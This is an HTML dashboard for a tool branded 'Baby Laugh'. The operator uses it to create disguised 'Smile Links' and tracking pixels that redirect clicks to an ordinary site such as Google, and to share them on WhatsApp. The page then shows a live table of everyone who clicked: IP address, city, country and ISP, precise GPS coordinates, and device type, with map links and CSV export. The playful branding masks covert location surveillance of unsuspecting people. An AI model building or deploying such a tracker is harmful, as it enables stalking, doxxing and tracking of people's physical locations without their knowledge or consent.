<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>Baby Laugh 😄</title><style>
body{font-family:system-ui;background:#1a1a2e;color:#eee;margin:0;padding:16px}
.card{background:#22223a;border:1px solid #3a3a5c;border-radius:12px;padding:16px;margin-bottom:16px;max-width:900px;margin-inline:auto}
input{background:#1a1a2e;color:#eee;border:1px solid #3a3a5c;border-radius:8px;padding:10px;width:65%}
button{background:#ff6b9d;color:#fff;border:0;border-radius:8px;padding:10px 16px;cursor:pointer;margin:4px;font-weight:bold}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{padding:6px;border-bottom:1px solid #3a3a5c;text-align:left}
a{color:#7dd3fc}h1,h3{color:#ff6b9d}.badge{background:#ff6b9d;border-radius:10px;padding:2px 10px;font-size:12px}
small{color:#999}code{color:#ffd166;word-break:break-all}
</style></head><body>
<h1 style="text-align:center">👶 Baby Laugh 😄</h1>
<div class=card>
 <h3>😄 Create Smile</h3>
 <input id=redir placeholder="Where should they go after clicking? (default: google.com)">
 <button onclick=create()>😄 Create Smile</button>
 <div id=out style="margin-top:12px;word-break:break-all"></div>
</div>
<div class=card>
 <h3>👀 All Visitors <span class=badge id=cnt>0</span>
   <button onclick="location.href='/api/export'">Export CSV</button></h3>
 <table><thead><tr><th>Link</th><th>Time</th><th>IP</th><th>Location</th><th>GPS</th><th>Device</th><th>Map</th></tr></thead>
 <tbody id=rows></tbody></table>
 <small>Auto-refreshes every 3 seconds</small>
</div>
<script>
async function create(){
 const r=await fetch('/api/create?redirect='+encodeURIComponent(document.getElementById('redir').value||'https://www.google.com'));
 const d=await r.json();
 document.getElementById('out').innerHTML=
  'Your Smile Link: <a href="'+d.link+'" target=_blank>'+d.link+'</a><br>'+
  'Pixel: <code>'+d.pixel+'</code><br><br>'+
  '<button onclick="location.href=\'https://wa.me/?text='+encodeURIComponent(d.link)+'\'">Share on WhatsApp</button>';
}
async function refresh(){
 const db=await(await fetch('/api/all')).json();let total=0,html='';
 for(const[id,t]of Object.entries(db))t.hits.forEach(h=>{total++;
  const loc=h.geo?(h.geo.city||'?')+', '+(h.geo.country||'?')+' — '+(h.geo.isp||''):'—';
  const gps=h.gps?h.gps.lat.toFixed(5)+', '+h.gps.lon.toFixed(5)+' ±'+Math.round(h.gps.acc)+'m':'—';
  const ll=h.gps?h.gps.lat+','+h.gps.lon:(h.geo&&h.geo.lat?h.geo.lat+','+h.geo.lon:null);
  const dev=(h.ua||'').match(/(Android|iPhone|iPad|Windows|Mac|Linux)/i);
  html+='<tr><td>'+id+'</td><td>'+new Date(h.ts).toLocaleString()+'</td><td>'+(h.ip||'')+'</td><td>'+loc+'</td><td>'+gps+'</td><td>'+(dev?dev[0]:'?')+'</td><td>'+(ll?'<a href="https://maps.google.com/?q='+ll+'" target=_blank>📍 Map</a>':'—')+'</td></tr>';});
 document.getElementById('cnt').textContent=total+' visitors';
 document.getElementById('rows').innerHTML=html||'<tr><td colspan=7>No visitors yet 😴</td></tr>';
}
refresh();setInterval(refresh,3000);
</script></body></html>
